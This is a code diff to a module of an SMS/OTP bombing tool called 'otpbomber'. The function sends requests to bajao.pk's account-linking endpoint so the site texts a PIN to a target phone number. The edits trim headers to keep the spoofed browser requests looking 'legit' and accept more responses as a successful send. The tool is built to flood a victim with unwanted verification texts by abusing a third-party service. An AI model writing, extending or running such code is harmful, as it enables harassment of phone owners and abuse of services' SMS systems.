@@ -1,4 +1,3 @@
-import random
 from otpbomber.core import *
 from otpbomber.localuseragent import *
 
@@ -9,16 +8,13 @@ async def bajao(phone, client, out):
 
 
     headers = {
-        'Accept-Language': 'en-US,en;q=0.9',
         'X-Requested-With': 'XMLHttpRequest',
-        'User-Agent': random.choice(ua["browsers"]["chrome"]),
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'User-Agent': random.choice(ua["browsers"]["chrome"]),   # core.py has "import random" and we imported core.py so we can use random.anyfunction, we are importing * for this 
         'Origin': 'https://bajao.pk',
-        'Referer': 'https://bajao.pk/linkAccount',
-        'Priority': 'u=1, i',
-        'Connection': 'keep-alive',
+        'Referer': 'https://bajao.pk/linkAccount'
     }
+
+    # i deleted the accept headers and sec * headers because they are not needed and the headers above are enough to make the request legit
 
 
     data = {
@@ -32,7 +28,7 @@ async def bajao(phone, client, out):
         )
     try:
         response_data = response.json()
-        if response_data.get("msg") == "PIN has been sent via SMS to your phone number":  
+        if response_data.get("msg") == "PIN has been sent via SMS to your phone number" or response_data.get("msg") == "success":  
             out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": True, "error": False})
             return None
         else:
